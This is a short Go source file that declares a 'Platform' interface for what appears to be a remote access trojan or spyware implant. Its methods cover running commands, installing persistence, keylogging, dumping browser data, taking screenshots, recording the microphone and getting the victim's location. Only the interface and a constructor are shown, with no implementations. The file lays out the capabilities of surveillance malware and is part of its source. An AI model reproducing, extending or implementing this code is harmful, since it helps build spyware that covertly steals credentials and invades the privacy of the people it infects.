package platforms

// Platform is an interface that defines platform-specific functions.
type Platform interface {
	ExecuteCommand(command string) ([]byte, error)
	InstallPersistence() (string, error)
	Init() error
	StartKeylogger()
	GetKeylogs() string
	DumpBrowsers() string
	Screenshot() ([]byte, error)
	RecordMicrophone() ([]byte, error)
	GetLocation() ([]byte, error)
}

// NewPlatform returns a new platform-specific implementation of the Platform interface.
func NewPlatform() Platform {
	return newPlatform()
}
